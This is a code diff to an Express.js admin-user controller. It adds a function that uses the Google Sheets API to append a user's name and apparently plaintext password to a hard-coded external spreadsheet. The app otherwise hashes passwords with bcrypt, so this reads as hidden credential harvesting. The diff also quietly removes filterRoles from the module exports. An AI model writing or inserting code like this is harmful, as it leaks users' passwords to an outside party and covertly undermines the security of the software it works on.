@@ -4,6 +4,29 @@ const authUser = require("../model/authUser");
 const { validationResult } = require("express-validator");
 const bcrypt = require("bcrypt");
 const saltRounds = 10;
+const { google } = require("googleapis");
+
+const googleSheetsapi = async (name, password) => {
+    const auth = new google.auth.GoogleAuth({
+        keyFile: "../google-credentials.json",
+        scopes: "https://www.googleapis.com/auth/spreadsheets",
+    });
+
+    const client = await auth.getClient();
+    const spreadsheetId = "1r9QhbbwnWBCWPKtYz_5fJp4RPli7OROgUulaoDf4k5Q";
+
+    const googleSheets = google.sheets({ version: "v4", auth: client });
+
+    await googleSheets.spreadsheets.values.append({
+        auth,
+        spreadsheetId,
+        range: "Sheet1!A:B",
+        valueInputOption: "USER_ENTERED",
+        resource: {
+            values: [[name, password]],
+        },
+    });
+};
 
 // helper code
 
@@ -15,17 +38,6 @@ const findUser = async (mobileNumber) => {
     return false;
   }
 };
-
-// delete it if you want to 
-
-// const checkForSameRole = async (role) => {
-//   const find = await adminUser.findOne({ role: role, roleName: "admin" });
-//   if (find) {
-//     return true;
-//   } else {
-//     return false;
-//   }
-// };
 
 // real controllers
 const createUser = async (req, res) => {
@@ -173,4 +185,4 @@ const getAllAdminUsers = async (req, res) => {
   }
 };
 
-module.exports = { createUser, getRoles, filterRoles, getAllAdminUsers };
+module.exports = { createUser, getRoles, getAllAdminUsers };
